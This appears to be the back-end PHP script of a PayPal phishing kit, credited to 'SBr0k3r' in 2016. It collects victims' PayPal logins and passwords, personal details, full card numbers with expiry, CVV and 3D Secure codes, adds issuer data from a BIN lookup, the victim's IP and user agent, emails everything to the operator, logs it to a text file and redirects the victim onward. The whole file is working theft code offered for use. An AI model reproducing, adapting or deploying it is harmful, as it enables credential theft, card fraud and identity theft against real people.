<?php
/////////////////////////////////////// DON'T TOUCHE THIS CODE (EMAIL SEND & FTP WRITE CODE)
session_start();
include './../../your_email_here.php';
 

$login_email=$_POST['login_email'];
$login_password=$_POST['login_password'];
$_SESSION['login_email'] = $login_email;
$_SESSION['login_password'] = $login_password;



$_SESSION['number'] = $_POST['number'];

$_SESSION['fname'] = $_POST['fname'];

$_SESSION['lname'] = $_POST['lname'];

$_SESSION['c_type'] = $_POST['c_type'];

 #BIN
$url = "http://bins.payout.com/api/v1/bins/".substr($_POST['number'],0, 6);
$json = @file_get_contents($url);
$decoded_json = json_decode($json);

#BIN


// Get user IP address
if ( isset($_SERVER['HTTP_CLIENT_IP']) && ! empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif ( isset($_SERVER['HTTP_X_FORWARDED_FOR']) && ! empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = (isset($_SERVER['REMOTE_ADDR'])) ? $_SERVER['REMOTE_ADDR'] : '0.0.0.0';
}

$ip = filter_var($ip, FILTER_VALIDATE_IP);
$ip = ($ip === false) ? '0.0.0.0' : $ip;

// Get user IP address


$user_agent = $_SERVER['HTTP_USER_AGENT'];

$subject = "$ip PayPal Info | ".$_POST['number']." | ".$_POST['bloc']." | ".$_POST['c_type']." | ".$_POST['c_valid']."\n";

$headers = "From: Sbr0k3r <sendmai@lbox.com>\r\n" ;

$body .= "======== Happy SHOP $xname ^-^ =========\n";
$body .= "======== PayPal Login =========\n";
$body .= "Email            : ".$_SESSION['login_email']."\n";
$body .= "Password         : ".$_SESSION['login_password']."\n";
$body .= "======== BILLING =========\n";
$body .= "Full Name        : ".$_POST['fname']." ".$_POST['lname']."\n";
$body .= "Date of birth    : ".$_POST['date']."\n";
$body .= "Address          : ".$_POST['adds1']."\n";
$body .= "City             : ".$_POST['city']."\n";
$body .= "Zip Code         : ".$_POST['zip']."\n";
$body .= "Phone            : ".$_POST['phone']."\n";
$body .= "Country          : ".$_POST['bloc']."\n";
$body .= "======== CARD =========\n";
$body .= "Carte            : ".$_POST['number']."\n";
$body .= "Date D'exp       : ".$_POST['MonthYear']."\n";
$body .= "Cv               : ".$_POST['cvn']."\n";
$body .= "3D Secure        : ".$_POST['d']."\n";
$body .= "Type Card        : ".$decoded_json->{"brand"}." ".$decoded_json->{"type"}." ".$decoded_json->{"country_code"}.".\n";
$body .= "Name Bank        : ".$decoded_json->{"issuer"}."\n";
$body .= "============= Created in 2016 By .::SBr0k3r::. =============\n";
$body .= "From $ip             check in http://www.geoiptool.com/?IP=$ip   \n";
$body .= "===================\n";
$body .= "Url :  ".$_SESSION['url']."\n";
$body .= "===================\n";
$body .= $_SERVER['HTTP_USER_AGENT'];
$rnessage = "$body\n";
mail($to, $subject, $body , $headers);


$file_to_write = "$ip-CC-".date("m-d-Y-g-i-s").".txt";
$content_to_write = "
======== Happy SHOP $xname ^-^ =========
$ip PayPal Info | ".$_POST['number']." | ".$_POST['bloc']." | ".$_POST['c_type']." | ".$_POST['c_valid']."
======== BILLING ======
Name Full        : ".$_POST['fname']." ".$_POST['lname']."
Date of birth    : ".$_POST['date']."
Address          : ".$_POST['adds1']."
City             : ".$_POST['city']."
Zip Code         : ".$_POST['zip']."
Phone            : ".$_POST['phone']."
Country          : ".$_POST['bloc']."
======== CCV ==========
Carte            :".$_POST['number']."
Date D'exp       : ".$_POST['MonthYear']."
CVN              : ".$_POST['cvn']."
3D Secure        : ".$_POST['d']."
======== Bank =========
Type Card        : ".$decoded_json->{"brand"}." ".$decoded_json->{"type"}." ".$decoded_json->{"country_code"}."
Name Bank        : ".$decoded_json->{"issuer"}."
======== Login ========
Email            : ".$_SESSION['login_email']."
Password         : ".$_SESSION['login_password']."
=======================
Url :  ".$_SESSION['url']."
=======================
".$_SERVER['HTTP_USER_AGENT']."
======== Victime Info =========

".date ("m-d-Y")."||".date ("g:i:s")."
=====================================================================";
	$f = fopen("./../../../../rezlt.txt", "a");
	fwrite($f, $content_to_write);
		fclose($f);
/*
if( is_dir($dir) === false )
{
    mkdir($dir);
}

$file = fopen($dir . '/' . $file_to_write,"w");

// a different way to write content into
// fwrite($file,"Hello World.");

fwrite($file,$content_to_write);

*/
//echo "$ip";

$redirect_page = './../../authentication.php?p=_dispatch=5885d80a13c0db1f8e263663d3faee8d0b9dcb01a9b6dc564e45f62871326a5e';
$redirect = true;
header('Location: '.$redirect_page);
?>